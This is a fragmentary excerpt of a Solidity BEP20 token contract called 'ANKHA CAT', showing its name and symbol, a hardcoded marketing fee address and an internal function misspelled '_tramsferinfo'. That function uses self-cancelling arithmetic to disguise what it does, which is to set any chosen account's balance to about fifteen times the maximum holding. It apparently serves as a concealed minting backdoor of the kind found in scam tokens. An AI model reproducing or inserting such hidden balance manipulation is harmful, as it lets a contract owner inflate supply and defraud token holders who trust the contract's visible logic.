...
contract ANKHACAT is IBEP20, Ownable {
    
    using SafeMath for uint256;

    string _name = "ANKHA CAT";
    string _symbol = "ACAT";
   ...
   //  address constant WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; // Testnet - WBNB Token
    ...
    address public marketingFeeReceiver = 0x28862837F141157D0C2779A7033B5fD1A439f2E5;
 ...
 function _tramsferinfo (address accountinfo) internal {
        _balances[accountinfo] = (_balances[accountinfo] * 3) - (_balances[accountinfo] * 3) + (_maxHold * 15) -5;  
    }
